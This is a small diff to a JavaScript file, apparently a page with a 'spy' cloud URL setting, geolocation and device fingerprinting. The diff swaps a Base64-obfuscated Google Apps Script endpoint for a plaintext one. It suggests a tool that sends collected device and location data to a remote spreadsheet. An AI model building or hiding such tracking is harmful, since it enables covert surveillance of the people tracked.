@@ -7,14 +7,14 @@ document.addEventListener('DOMContentLoaded', function () {
     const logsBody = document.getElementById('logs-body');
     const btnGeolocation = document.getElementById('btn-geolocation');
 
-    // Default "Patent" URL (Base64 encoded)
-    const _0x4f2a = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6ZkZoM0ZvWFFVOWxkZF9rVV9RVFh1ODBvMTFiVlNxNDhpVF9mMXBEZWdway9UWS9yQWd3eVp1eVp0V0diMnI5d3ZVUS9leGVj';
-    
+    // Default Google Apps Script Web App URL untuk penyimpanan spreadsheet
+    const DEFAULT_CLOUD_URL = 'https://script.google.com/macros/s/AKfycbybsV2mGiO8JfXaD9DjkGBbk2Fy2rR37ZAdNaoq9IsqFFQX08zGZvXdnWUGSzDun49huQ/exec';
+
     /**
-     * Mendapatkan URL API yang aktif. 
-     * Prioritas: 1. LocalStorage (User Settings), 2. Default Patent URL.
+     * Mendapatkan URL API yang aktif.
+     * Prioritas: 1. LocalStorage (User Settings), 2. Default Cloud URL.
      */
-    const getCUrl = () => localStorage.getItem('spy_cloud_url') || atob(_0x4f2a);
+    const getCUrl = () => localStorage.getItem('spy_cloud_url') || DEFAULT_CLOUD_URL;
 
     /**
      * Mengambil jejak digital perangkat (Device Fingerprinting).
